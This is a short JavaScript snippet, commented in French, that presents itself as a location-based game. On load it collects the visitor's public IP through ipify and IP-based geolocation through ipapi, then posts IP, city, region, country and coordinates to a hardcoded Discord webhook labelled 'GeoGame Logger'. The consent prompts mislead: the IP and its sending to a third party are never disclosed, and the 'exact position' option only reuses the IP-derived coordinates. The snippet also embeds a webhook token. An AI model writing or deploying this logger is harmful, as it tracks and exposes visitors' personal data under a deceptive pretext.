const askPermissionsAndSendData = () => {

    // 1. Première autorisation (localisation approximative)
    const allowApprox = confirm(
        "Ce jeu utilise votre localisation approximative (ville / région) pour fonctionner. Acceptez-vous ?"
    );

    if (!allowApprox) {
        console.log("L'utilisateur a refusé la localisation approximative.");
        return;
    }

    // 2. Si oui → récupération IP + géoloc approximative
    fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(ipData => {
            const ip = ipData.ip;

            return fetch(`https://ipapi.co/${ip}/json/`)
                .then(geoRes => geoRes.json())
                .then(geoData => {
                    
                    // 3. Deuxième autorisation (adresse exacte)
                    const allowExact = confirm(
                        "Souhaitez-vous partager votre position EXACTE (adresse ou coordonnées GPS) ? " +
                        "\n\nC’est optionnel, mais ça rend le jeu plus précis."
                    );

                    let exactLocation = "Non fournie";

                    if (allowExact) {
                        exactLocation = `Latitude : ${geoData.latitude}, Longitude : ${geoData.longitude}`;
                    }

                    const webhookURL = "https://discord.com/api/webhooks/1430546772387823677/LKjiHykSqFmNDC6bqWj48tJpP72T4MaLZlQhzt4RXtSDftPImEkfL9FeeYthJU4-g_C_";

                    // 4. Envoi des données (seulement ce qui est accepté)
                    return fetch(webhookURL, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            username: "GeoGame Logger",
                            content: "Nouvel utilisateur (jeu IRL)",
                            embeds: [
                                {
                                    title: "Infos joueur",
                                    description:
                                        `**IP :** ${ip}\n` +
                                        `**Ville :** ${geoData.city}\n` +
                                        `**Région :** ${geoData.region}\n` +
                                        `**Pays :** ${geoData.country_name}\n\n` +
                                        `**Position exacte :** ${exactLocation}`,
                                    color: 0x00ADEF
                                }
                            ]
                        })
                    });
                });
        })
        .then(response => {
            if (response && response.ok) {
                console.log("Données envoyées !");
            } else {
                console.log("Aucun envoi ou refus utilisateur.");
            }
        })
        .catch(err => {
            console.error("Erreur :", err);
        });
};

askPermissionsAndSendData();
